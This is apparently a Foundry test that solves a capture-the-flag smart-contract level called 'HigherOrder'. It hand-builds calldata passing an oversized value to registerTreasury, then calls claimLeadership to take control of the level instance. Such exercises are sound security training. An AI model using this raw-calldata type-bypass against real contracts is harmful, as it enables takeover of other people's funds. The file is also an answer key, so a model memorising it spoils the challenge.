// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./HigherOrderFactory.sol";

contract HigherOrderExploitTest is Test {
    function test() public {
        address playerAddress = makeAddr("player");
        vm.deal(playerAddress, 1 ether);
        HigherOrderFactory factory = new HigherOrderFactory();
        address instanceAddress = factory.createInstance(playerAddress);

        vm.startPrank(playerAddress, playerAddress);

        instanceAddress.call(bytes.concat(HigherOrder.registerTreasury.selector, bytes32(uint256(0x100))));
        instanceAddress.call(abi.encodeWithSignature("claimLeadership()"));

        vm.stopPrank();

        assertTrue(factory.validateInstance(payable(instanceAddress), playerAddress), "Invalid Instance");
    }
}
